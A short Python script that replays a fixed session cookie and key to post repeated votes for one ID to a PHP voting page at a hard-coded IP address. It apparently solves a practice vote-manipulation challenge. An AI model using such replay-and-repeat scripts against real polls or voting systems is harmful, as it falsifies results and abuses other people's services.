#!/usr/bin/python3
import requests
from colorama import Fore

url = 'http://158.69.76.135/level1.php'
cookies = {
    'PHPSESSID': '84cgtshoc5m5mvabqrrce85f64',
    'HoldTheDoor': '750ecaa29e0dc697438bd7f6e26736094d276462'
}
myobj = {
    'id': '28',
    'holdthedoor': 'Submit',
    'key': '750ecaa29e0dc697438bd7f6e26736094d276462'
}
for i in range(1, 5):
    requests.post(url, data=myobj, cookies=cookies)
    print(Fore.YELLOW +"voting for: {}, I've done {} votes".format(myobj.get("id"), i))
print(Fore.GREEN + "I've done {} votes, by the user {}".format(i, (myobj.get("id"))))
